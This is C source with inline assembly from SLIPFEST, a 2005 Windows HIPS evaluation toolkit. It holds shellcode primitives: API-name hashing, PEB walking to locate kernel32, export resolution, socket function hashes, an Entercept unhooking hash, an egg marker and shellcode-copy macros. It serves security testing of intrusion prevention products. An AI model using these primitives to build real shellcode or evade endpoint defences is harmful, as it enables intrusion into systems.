/* SLIPFEST                                 / \/  \ \/    \                    *
 *                                            /   \   \/\                      *
 *											      /\  /                        *
 * (C) 2005 Yoann GUILLOT                    o      ||   o                     *
 *          Julien TINNES                   -U-     ||  /V\                    *
 *                                          / \     ||  / \                    *
 *                                                                             *
 * System Level Intrusion Prevention Framework Evaluation Suite and Toolkit    *
 *                                                                             *
 *        "c'est la fête du slip!"                                             *
 *                                                                             *
 * SLIPFEST is a Windows 32bits HIPS evaluation suite.                         *
 * Copyright (C) 2005 Y. Guillot & J. Tinnes                                   *
 *                                                                             *
 * This program is free software; you can redistribute it and/or               *
 * modify it under the terms of the GNU General Public License                 *
 * as published by the Free Software Foundation; either version 2              *
 * of the License, or (at your option) any later version.                      *
 *                                                                             *
 * This program is distributed in the hope that it will be useful,             *
 * but WITHOUT ANY WARRANTY; without even the implied warranty of              *
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the               *
 * GNU General Public License for more details.                                *
 *                                                                             *
 * You should have received a copy of the GNU General Public License           *
 * along with this program; if not, write to the                               *
 * Free Software Foundation, Inc.,                                             *
 * 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.               *
 *                                                                             *
 */

#define H_CloseHandle 0xBFD87FEC
#define H_CreateFileA 0xBD2BE000
#define H_CreateProcessA 0xF390B59F
#define H_ExitProcess 0xC3F39F16
#define H_ExitThread 0x777B0706
#define H_FreeLibrary 0xAD026E4E
#define H_GetCommandLineA 0x9B81B77B
#define H_GetModuleFileNameA 0x6BB22D83
#define H_GetModuleHandleA 0x48269992
#define H_GetStartupInfoA 0x1EBC33D7
#define H_LoadLibraryA 0x74776072
#define H_MessageBoxA 0x1545E26D
#define H_Sleep 0x4D86D96A
#define H_VirtualAlloc 0x52A48D7E
#define H_VirtualFree 0x9D601831
#define H_VirtualProtect 0x30DBCA36
#define H_WinExec 0xF4C07457

#define H_WSAStartup 0x6E59DFE7
#define H_WSACleanup 0x6238CDE9
#define H_socket 0x5B724978
#define H_bind 0xD5263B80
#define H_listen 0x6D274975
#define H_accept 0x4F2A4C32
#define H_connect 0xCF630557
#define H_send 0xCD274B80
#define H_recv 0xCDB738C0
#define H_closesocket 0xCF3BCE33

#define H_ENTERCEPT 0x21256AA3	// Exp_UnhookAllAPIFunctions 

#define H_SetAbortProc 0x4BB13728


/* hashes the string pointed by esi into ebx // zeroes eax */
__inline void HASHNAME(void) {
	_asm {
		xor eax, eax
		xor ebx, ebx
hashname_loop:
		lodsb
		test eax, eax
		jz hashname_end
//		or al,  0x20
		add ebx, eax
		ror ebx, 0xd
		jmp hashname_loop
hashname_end:
	}
}

#define RESOLVE_FORWARDS 1

/* get the proc which hash is in edi from the lib which base is in esi
   returns addr in eax */
__inline void FINDPROC(void) {
	_asm {
findproc:
		pushad
		mov ebp, esi
		add esi, [esi+0x3c]		/* PE header */
		mov eax, [esi+0x78]		/* directories */
		mov ebx, [esi+0x7c]
		test ebx, ebx			/* no exports */
		jz findproc_notfound
#ifdef RESOLVE_FORWARDS
		push eax				/* save export rva */
		push ebx				/* save export len */
#endif
		lea edx, [ebp+eax+0x18]
		mov ecx, [edx]			/* number of names */
		mov eax, [edx+8]		/* names rva	*/
		add eax, ebp			/* names		*/
findproc_searchproc:
		mov esi, [eax+4*ecx-4]	/* name rva  --  -4 to predecrement for loopnz */
		add esi, ebp			/* name */
		push eax
	}; HASHNAME(); _asm {
		pop eax
		cmp ebx, edi
		loopnz findproc_searchproc
		jecxz findproc_notfound
		/* found */
		mov esi, [edx+0xc]		/* ordinal table rva */
		add esi, ebp			/* ordinal table */
		movzx ecx, word ptr [esi+ecx*2]
		mov esi, [edx+4]		/* func table rva */
		add esi, ebp			/* func table */
		mov esi, [esi+4*ecx]	/* entrypoint rva */
#ifdef RESOLVE_FORWARDS
		pop ebx					/* restore export len */
		pop eax					/* restore export rva */
		cmp esi, eax
		jb noforwarder
		add ebx, eax
		cmp esi, ebx
		jae noforwarder

		/* forwarder */
		add esi, ebp			/* esi -> export string start */		
		/* search the lib handle in the peb.ldr */
		mov eax, fs:[0x30]		/* peb */
		mov eax, [eax+0x0C]		/* ldr */
		lea ebx, [eax+0x0C]		/* &ldr->listhead (keep to test end of peb->ldr list) */
		mov eax, [ebx]			/* listnode */

lib_next:
		push eax				/* save listnode */
		mov edi, [eax+0x30]		/* basename (unicode) */
		xor ecx, ecx
lib_char_next:
		mov al, [esi+ecx]
		mov dl, [edi+2*ecx]
		inc ecx
		or al, 0x20
		or dl, 0x20
		cmp al, dl
		jnz lib_no_match
		cmp al, '.'
		jnz lib_char_next

		/* lib found */
		add esi, ecx
	}; HASHNAME(); _asm {
		mov edi, ebx
		pop eax					/* retr listnode */
		mov esi, [eax+0x18]		/* lib handle */
		call findproc			/* recurse */
		mov esi, eax
		jmp findproc_retloc

lib_no_match:
		pop eax					/* retr listnode */
		mov eax, [eax]
		cmp eax, ebx
		jnz lib_next
		jmp findproc_notfound

noforwarder:
#endif
		add esi, ebp			/* entrypoint */
		jmp findproc_retloc
findproc_notfound:
		xor esi, esi
findproc_retloc:
		mov [esp+0x1c], esi		/* eax after popad */
		popad
		ret
	}
}

/* calls the messagebox function: must have k32handle in esi, and findproc must follow the code */
/* usage: push title, push text, call do_msgbox */
__inline void DOMSGBOX(void) {
	_asm {
		// loads user32, copy the 4 args for messageboxa, cleanup and restore esi to k32handle
		push ebp
		mov ebp, esp

		push '23'
		push 'resu'

		push esp			// "user32"
		mov edi, H_LoadLibraryA
		call find_proc
		call eax

		push eax			// user32 handle -> futur arg to freelib
		push esi			// save kernel32 handle

		mov esi, eax
		mov edi, H_MessageBoxA
		call find_proc

		push 0
		push [ebp+0x0C]
		push [ebp+0x08]
		push 0
		call eax			// messagebox

		pop esi				// restore k32 handle
		mov edi, H_FreeLibrary
		call find_proc
		call eax			// arg = user32 handle

		leave
		ret 8
find_proc:
	}
}


#define EGG_VALUE 0x43424342
__inline void EGG(void) {
	_asm {
		// egg even
		inc edx
		inc ebx
		inc edx
		inc ebx
		inc edx
		inc ebx
		inc edx
		inc ebx
		inc edx
		inc ebx

		inc edx

		// egg odd
		inc edx
		inc ebx
		inc edx
		inc ebx
		inc edx
		inc ebx
		inc edx
		inc ebx
		inc edx
		inc ebx
	}
}

/* returns the address of kernel32 in esi (from the PEB). ebx is zeroed */
__inline void FINDK32(void) {
	_asm {
		xor ebx, ebx
		mov esi, fs:[ebx+0x30]	// peb
		mov esi, [esi+0x0c]		// ldr
		mov esi, [esi+0x1c]		// ldr->init  -> ntdll
		lodsd					// kernel32
		mov esi, [eax+0x08]		// base address
	}
}

/* returns the address of kernel32 in esi (from the PEB). ebx is zeroed */
__inline void FINDNTDLL(void) {
	_asm {
		xor ebx, ebx
		mov esi, fs:[ebx+0x30]	// peb
		mov esi, [esi+0x0c]		// ldr
		mov eax, [esi+0x1c]		// ldr->init  -> ntdll
		mov esi, [eax+0x08]		// base address
	}
}

/* args must be pushed manually on the stack: start, end, dest, dest_len */
/* copies the bytes from start to end to dest, puts len in dest_len, then jumps to end */
__inline void INITSC(void) {
	_asm {
		push ebp
		mov ebp, esp

		push esi	/* backup */
		push edi
		push ecx
		mov esi, [ebp+0x10]	/* start */
		mov ecx, [ebp+0xc]	/* end */
		sub ecx, esi
		mov eax, [ebp+4]
		mov [eax], ecx		/* end-start -> dest_len */
		mov edi, [ebp+8]
		rep movsb
		pop ecx
		pop edi
		pop esi
		mov eax, [ebp+0xc]
		pop ebp
		add esp, 0x10
		jmp eax
	}
}

#define INITSHELLCODE_GENERIC(buf) \
	_asm { push sc_start } \
	_asm { push sc_end } \
	_asm { push offset buf } \
	_asm { push offset buf##_len } \
	INITSC()

#define INITSHELLCODE \
	_asm { mov eax, sc_start } \
	_asm { mov shellcode_peptr, eax } \
	INITSHELLCODE_GENERIC(shellcode)

// set the absolute addr of the dword to fixup from the buffer in sc_fixup
#define INITSHELLCODE_FIXUP \
	_asm { lea eax, shellcode } \
	_asm { add eax, fixmeup } \
	_asm { sub eax, sc_start } \
	_asm { inc eax } \
	_asm { mov sc_fixup, eax } \
	_asm { mov eax, sc_start } \
	_asm { mov shellcode_peptr, eax } \
	INITSHELLCODE_GENERIC(shellcode)
